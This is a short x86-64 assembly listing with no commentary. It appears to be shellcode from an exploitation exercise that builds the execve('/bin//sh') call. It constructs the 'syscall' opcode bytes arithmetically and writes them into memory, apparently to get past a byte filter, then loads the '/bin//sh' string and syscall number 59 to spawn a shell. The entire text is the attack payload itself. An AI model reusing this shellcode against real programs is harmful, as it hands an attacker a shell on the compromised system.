section .text
    global _start
        _start:
            xor rcx, rcx
            mov ch, 0x0e
            add ch, 0x01
            mov [rbp-0xd5],ch
	    mov cl,0x04
            add cl,0x01
	    mov [rbp-0xd4],cl
            xor rcx, rcx
            xor eax, eax
    xor rdi, rdi
xor rsi, rsi
xor rdx, rdx
xor rax, rax
push rax
mov rbx, 0x68732f2f6e69622f
push rbx
mov rdi, rsp
mov al, 59



